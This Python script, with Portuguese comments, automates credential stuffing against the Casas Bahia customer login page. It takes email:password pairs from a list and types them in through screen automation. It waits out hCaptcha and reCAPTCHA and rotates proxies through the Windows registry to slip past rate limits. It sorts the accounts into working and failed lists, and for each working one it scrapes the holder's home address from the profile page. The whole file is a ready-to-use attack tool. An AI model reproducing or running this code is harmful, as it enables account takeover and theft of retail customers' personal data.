import pyautogui
import time
import os
import pyperclip  # Biblioteca para manipular a área de transferência
import winreg
import random
from colorama import init, Fore, Back, Style

# DEFININDO AS IMAGENS NECESSÁRIAS
detect_browser = './database/imgs/browser.png'
email_input = './database/imgs/input.png'
pass_input = './database/imgs/passinput.png'
login_button = './database/imgs/loginbutton.png'
error_pass = './database/imgs/errorpass.png'
recaptcha = './database/imgs/recaptcha.png'
hcaptcha = './database/imgs/hcaptcha.png'
forget = './database/imgs/forget.png'
cleaner = './database/imgs/cleaner.png'
ratelimit_detect = './database/imgs/rate.png'
twostep_detect = './database/imgs/2steps.png'
invalidcpf_detect = './database/imgs/invalidcpf.png'
cadastro_detect = './database/imgs/cadastro.png'
invalidpass_detect = './database/imgs/invalidpass.png'
approved1_detect = './database/imgs/approved1.png'
approved2_detect = './database/imgs/approved2.png'

max_wait_time = 180  # 3 minutos
elapsed_time = 0  # Tempo decorrido

max_wait_time2 = 360  # 3 minutos
elapsed_time2 = 0  # Tempo decorrido

def rotacionar_proxy(arquivo_proxy):
    try:
        # Lê todas as linhas do arquivo de proxies
        with open(arquivo_proxy, 'r') as arquivo:
            linhas = arquivo.readlines()
        
        # Remove quebras de linha e linhas vazias
        proxies = [linha.strip() for linha in linhas if linha.strip()]
        
        # Escolhe um proxy aleatório
        if not proxies:
            print(Fore.BLACK + Back.RED + "Nenhum proxy encontrado no arquivo.")
            return
        
        proxy_server = random.choice(proxies)
        
        # Configura o proxy no registro do Windows
        chave_registro = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"
        chave = winreg.OpenKey(winreg.HKEY_CURRENT_USER, chave_registro, 0, winreg.KEY_SET_VALUE)
        
        # Define ProxyEnable como 1 para ativar o proxy
        winreg.SetValueEx(chave, "ProxyEnable", 0, winreg.REG_DWORD, 1)
        
        # Define o ProxyServer com o proxy selecionado
        winreg.SetValueEx(chave, "ProxyServer", 0, winreg.REG_SZ, proxy_server)
        
        # Fecha a chave do Registro
        winreg.CloseKey(chave)
        
        print(Fore.BLACK + Back.WHITE + f"Proxy configurado com sucesso: {proxy_server}")
    except FileNotFoundError:
        print(Fore.BLACK + Back.RED + f"Arquivo {arquivo_proxy} não encontrado.")
    except Exception as e:
        print(Fore.BLACK + Back.RED + f"Erro ao configurar o proxy: {e}")

# Função para carregar os logins de db.txt
def load_logins():
    if not os.path.exists(db_file):
        print(Fore.RED + Back.BLACK + f"[ERROR] Arquivo {db_file} não encontrado.")
        return []
    with open(db_file, 'r') as file:
        logins = file.readlines()
    return [login.strip() for login in logins]  # Remove quebras de linha

# Função para salvar o resultado no arquivo correto
def save_result(login, result_file):
    # Remover todas as quebras de linha e espaços extras
    login = login.replace('\n', '').replace('\r', '').strip()

    try:
        # Ler o arquivo para verificar a última linha existente
        with open(result_file, 'r+', encoding='utf-8') as file:
            lines = file.readlines()

            # Verificar a última linha
            if lines and lines[-1].strip():
                # Última linha está ocupada, adicionar uma nova linha
                file.write(f"\n{login}")
            else:
                # Última linha está livre, escrever diretamente nela
                if lines:
                    lines[-1] = login  # Substituir a última linha vazia
                else:
                    lines.append(login)  # Arquivo vazio, adiciona o login
                file.seek(0)  # Voltar ao início para reescrever
                file.writelines([line.strip() + '\n' for line in lines])
    except FileNotFoundError:
        # Se o arquivo não existir, cria um novo e escreve
        with open(result_file, 'w', encoding='utf-8') as file:
            file.write(login)

# Função para limpar cookies
def clean_browser_data():
    try:
        detect_button2 = pyautogui.locateCenterOnScreen(detect_browser, confidence=0.8)
        if detect_button2:
            pyautogui.click(detect_browser)
            #print("[INFO] OS COOKIES DA PÁGINA FORAM LIMPOS!")
            time.sleep(4)
            pyautogui.press('f6')
            time.sleep(1)
            pyautogui.write('chrome://settings/clearBrowserData')
            time.sleep(1)
            pyautogui.press('enter')
            time.sleep(3)
            pyautogui.press('tab')
            time.sleep(1)
            rotacionar_proxy("proxy.txt")
            time.sleep(1)
            pyautogui.press('enter')
            time.sleep(3)
            
        else:
            print(Fore.RED + Back.BLACK + "[ERROR] BARRA DE ENDEREÇO NÃO ENCONTRADA!")
    except pyautogui.ImageNotFoundException:
        print(Fore.RED + Back.BLACK + "[ERROR] BARRA DE ENDEREÇO NÃO ENCONTRADA!")

# Função para limpar cookies
def clean_cookies():    
    try:
        cleaner_btn = pyautogui.locateCenterOnScreen(cleaner, confidence=0.8)
        if cleaner_btn:
            pyautogui.click(cleaner_btn)
            #print("[INFO] OS COOKIES DA PÁGINA FORAM LIMPOS!")
            time.sleep(3)
        else:
            print(Fore.RED + Back.BLACK + "[ERROR] Nenhuma linha no arquivo db.txt.")
            print("[ERROR] EXTENSÃO DO CLEANER NÃO ENCONTRADA!")
    except pyautogui.ImageNotFoundException:
        print(Fore.RED + Back.BLACK + "[ERROR] Nenhuma linha no arquivo db.txt.")
        print("[ERROR] EXTENSÃO DO CLEANER NÃO ENCONTRADA!")        

# Função para capturar informações de endereço
def capture_address():
    time.sleep(4)
    pyautogui.press('f6')
    time.sleep(1)
    pyautogui.write('https://cliente.casasbahia.com.br/meu-perfil')
    time.sleep(1)
    pyautogui.press('enter')
    time.sleep(8)
    pyautogui.click(70, 527)
    time.sleep(5)

    data = {}

    def copy_content(x, y, key):
        pyautogui.click(x, y, clicks=3)
        time.sleep(1)
        pyautogui.hotkey('ctrl', 'c')
        time.sleep(1)
        data[key] = pyperclip.paste()

    copy_content(50, 438, "endereco1")
    copy_content(49, 467, "endereco2")
    copy_content(49, 498, "endereco3")

    return data

# Arquivos
db_file = './dados/db.txt'
live_file = './dados/live.txt'
die_file = './dados/die.txt'
recheck_file = './dados/recheck.txt'

# Criação dos arquivos de saída caso não existam
for file in [live_file, die_file, recheck_file]:
    if not os.path.exists(file):
        open(file, 'w').close()

# Loop principal para processar cada login
logins = load_logins()

if not logins:
    print(Fore.RED + Back.BLACK + "[ERROR] Nenhuma linha no arquivo db.txt.")
else:
    for login in logins:
        email, password = login.split(':')
        print(Fore.BLACK + Back.WHITE + f"[INFO] Testando login para: {email}:{password}")

        # Iniciar navegador
        detect = pyautogui.locateCenterOnScreen(detect_browser, confidence=0.8)
        if detect:
            #print("[DEBUG] Navegador encontrado!")
            pyautogui.click(4, 90)
            pyautogui.click(detect)
            time.sleep(1)
            pyautogui.press('f6')
            time.sleep(1)
            pyautogui.write('https://cliente.casasbahia.com.br/login')
            time.sleep(1)
            pyautogui.press('enter')
            time.sleep(10)
            # Verificar hcaptcha
            try:
                ishcaptcha = pyautogui.locateCenterOnScreen(hcaptcha, confidence=0.8)
                if ishcaptcha:
                    print(Fore.RED + Back.BLACK + "[INFO] hcaptcha encontrado! Aguardando...")
                    elapsed_time = 0
                    while ishcaptcha and elapsed_time2 < max_wait_time2:
                        time.sleep(1)
                        elapsed_time += 1
                        ishcaptcha = pyautogui.locateCenterOnScreen(hcaptcha, confidence=0.8)

                    if ishcaptcha:
                        raise Exception(Fore.RED + Back.BLACK + "hcaptcha não desapareceu após 3 minutos.")
                    else:
                        print(Fore.GREEN + Back.BLACK + "hcaptcha desapareceu.")
                else:
                    pass
                    #print(Fore.GREEN + Back.BLACK + "hcaptcha não foi chamado prosseguindo...")
            except pyautogui.ImageNotFoundException:
                pass
                #print(Fore.GREEN + Back.BLACK + "hcaptcha não foi encontrado, prosseguindo...")  
        else:
            print(Fore.RED + Back.BLACK + "[ERROR] Navegador não encontrado!")
            #save_result(f"DIE => {email}:{password} Response: Navegador não encontrado", die_file)
            time.sleep(3)
            continue  # Vai para o próximo login

        # Preencher o formulário de login
        email_input_pos = pyautogui.locateCenterOnScreen(email_input, confidence=0.8)
        if email_input_pos:
            pyautogui.click(email_input_pos)
            time.sleep(1)
            pyautogui.write(email)
            time.sleep(4)
            pyautogui.press('enter')
            time.sleep(10)
        else:
            print(Fore.RED + Back.BLACK + "[ERROR] Formulários não encontrados!")
            #save_result(f"DIE => {email}:{password} Response: Formulários não encontrados", die_file)
            continue  # Vai para o próximo login

        # Verificar recaptcha
        try:
            isrecaptcha = pyautogui.locateCenterOnScreen(recaptcha, confidence=0.8)
            if isrecaptcha:
                print(Fore.RED + Back.BLACK + "[INFO] Recaptcha encontrado! Aguardando...")
                elapsed_time = 0
                while isrecaptcha and elapsed_time < max_wait_time:
                    time.sleep(1)
                    elapsed_time += 1
                    isrecaptcha = pyautogui.locateCenterOnScreen(recaptcha, confidence=0.8)

                if isrecaptcha:
                    raise Exception(Fore.RED + Back.BLACK + "Recaptcha não desapareceu após 3 minutos.")
                else:
                    print(Fore.GREEN + Back.BLACK + "Recaptcha desapareceu.")
            else:
                pass
                #print(Fore.GREEN + Back.BLACK + "Recaptcha não foi chamado prosseguindo...")
        except pyautogui.ImageNotFoundException:
            #print(Fore.GREEN + Back.BLACK + "Recaptcha não foi encontrado, prosseguindo...")
            time.sleep(5)
          
        # Verificar a área de "Esqueci a senha"
        try:
            cadastro_conta = pyautogui.locateCenterOnScreen(cadastro_detect, confidence=0.8)
            if cadastro_conta:
                print(Fore.RED + Back.BLACK + "[RESULTADO] => Login Reprovado! Response: Conta não cadastrada")
                save_result(f"DIE => {email}:{password} Response: Conta não cadastrada", die_file)
                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue
                
        except pyautogui.ImageNotFoundException:
            pass      

        # Verificar a área de "Esqueci a senha"
        try:
            cpf_invalido = pyautogui.locateCenterOnScreen(invalidcpf_detect, confidence=0.8)
            if cpf_invalido:
                print(Fore.RED + Back.BLACK + "[RESULTADO] => Login Reprovado! Response: CPF ou CNPJ inválido")
                save_result(f"DIE => {email}:{password} Response: CPF ou CNPJ inválido", die_file)
                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue
                
        except pyautogui.ImageNotFoundException:
            pass          

        # Verificar a o input de senha
        try:
            senha_area = pyautogui.locateCenterOnScreen(pass_input, confidence=0.8)
            if senha_area:
                pyautogui.click(senha_area)
                time.sleep(1)
                pyautogui.write(password)
                time.sleep(1)
                pyautogui.press('enter')
                time.sleep(5)
                
        except pyautogui.ImageNotFoundException:
            print(Fore.RED + Back.BLACK + "[ERROR] Campo de senha não encontrado!")
            #save_result(f"DIE => {email}:{password} Response: Campo de senha não encontrado!", die_file)
            continue  # Vai para o próximo login

        # Verificar a área de "Esqueci a senha"
        try:
            pass_invalida = pyautogui.locateCenterOnScreen(invalidpass_detect, confidence=0.8)
            if pass_invalida:
                print(Fore.RED + Back.BLACK + "[RESULTADO] => Login Reprovado! Response: A senha deve conter ao menos uma letra/numero")
                save_result(f"DIE => {email}:{password} Response: A senha deve conter ao menos uma letra/numero", die_file)
                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue
                
        except pyautogui.ImageNotFoundException:
            pass  

        # Verificar recaptcha 2
        try:
            isrecaptcha = pyautogui.locateCenterOnScreen(recaptcha, confidence=0.8)
            if isrecaptcha:
                print(Fore.RED + Back.BLACK + "[INFO] Recaptcha 2 encontrado! Aguardando...")
                elapsed_time = 0
                while isrecaptcha and elapsed_time < max_wait_time:
                    time.sleep(1)
                    elapsed_time += 1
                    isrecaptcha = pyautogui.locateCenterOnScreen(recaptcha, confidence=0.8)

                if isrecaptcha:
                    raise Exception(Fore.RED + Back.BLACK + "Recaptcha 2 não desapareceu após 3 minutos.")
                else:
                    print(Fore.GREEN + Back.BLACK + "Recaptcha 2 desapareceu.")
            else:
                pass
                #print(Fore.GREEN + Back.BLACK + "Recaptcha 2 não foi chamado prosseguindo...")
        except pyautogui.ImageNotFoundException:
            #print(Fore.GREEN + Back.BLACK + "Recaptcha 2 não foi encontrado, prosseguindo...")
            time.sleep(3)

        # Verificar a área de "Esqueci a senha"
        try:
            password_invalida = pyautogui.locateCenterOnScreen(error_pass, confidence=0.8)
            if password_invalida:
                print(Fore.RED + Back.BLACK + "[RESULTADO] => Login Reprovado! Response: O usuário ou a senha digitada está incorreta!")
                save_result(f"DIE => {email}:{password} Response: O usuário ou a senha digitada está incorreta!", die_file)
                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue
                
        except pyautogui.ImageNotFoundException:
            pass

        try:
            rate_limit_area = pyautogui.locateCenterOnScreen(ratelimit_detect, confidence=0.8)
            if rate_limit_area:
                print(Fore.RED + Back.BLACK + "[INFO] Possível rate limiting atingido! Incluindo login na lista de reteste!")
                save_result(f"RE-CHECK => {email}:{password} Response: Rate Limiting Atingido!", recheck_file)
                
        except pyautogui.ImageNotFoundException:
            pass     

        try:
            twosteps_area = pyautogui.locateCenterOnScreen(twostep_detect, confidence=0.8)
            if twosteps_area:
                print(Fore.GREEN + Back.BLACK + "[RESULTADO] => Login Aprovado! Response: Verificação em 2 Etapas")
                save_result(f"LIVE => {email}:{password} Response: Verificação em 2 Etapas", live_file)
                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue

        except pyautogui.ImageNotFoundException:
            pass     

        try:
            approved1_area = pyautogui.locateCenterOnScreen(approved1_detect, confidence=0.8)
            if approved1_area:
                print(Fore.GREEN + Back.BLACK + "[RESULTADO] => Login Aprovado! Capturando endereço...")
                address_data = capture_address()
                formatted_result = (
                    f"LIVE => {email}:{password} Endereço => {address_data['endereco1']} {address_data['endereco2']} {address_data['endereco3']}"
                )
                save_result(formatted_result, live_file)

                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue
                            

        except pyautogui.ImageNotFoundException:
            pass    

        try:
            approved2_area = pyautogui.locateCenterOnScreen(approved2_detect, confidence=0.8)
            if approved2_area:
                print(Fore.GREEN + Back.BLACK + "[RESULTADO] => Login Aprovado! Capturando endereço...")
                address_data = capture_address()
                formatted_result = (
                    f"LIVE => {email}:{password} Endereço => {address_data['endereco1']} {address_data['endereco2']} {address_data['endereco3']}"
                )
                save_result(formatted_result, live_file)

                # Limpar cookies para o próximo teste
                clean_cookies()
                clean_browser_data()

                # Remover a linha do db.txt após o teste
                with open(db_file, 'r') as file:
                    lines = file.readlines()

                with open(db_file, 'w') as file:
                    for line in lines:
                        if line.strip() != login:
                            file.write(line)
                            continue
                            

        except pyautogui.ImageNotFoundException:
            pass    

